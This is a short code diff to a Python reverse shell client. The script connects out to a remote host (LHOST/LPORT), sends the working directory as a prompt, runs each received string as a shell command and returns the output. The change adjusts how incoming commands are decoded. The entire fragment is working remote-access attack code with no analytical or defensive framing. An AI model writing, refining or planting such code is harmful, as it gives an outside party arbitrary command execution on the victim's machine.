@@ -10,7 +10,7 @@ SendBack.connect((LHOST,LPORT))
 while True :
     path = os.getcwd()+ ' > '
     SendBack.sendall(bytes(path.encode()))
-    data = SendBack.recv(1024).decode()
+    data = SendBack.recv(1024).decode('latin-1')
     try:
         Data = subprocess.run(data,shell=True,capture_output=True)
         Data =bytes(Data.stdout.decode('latin-1').encode())
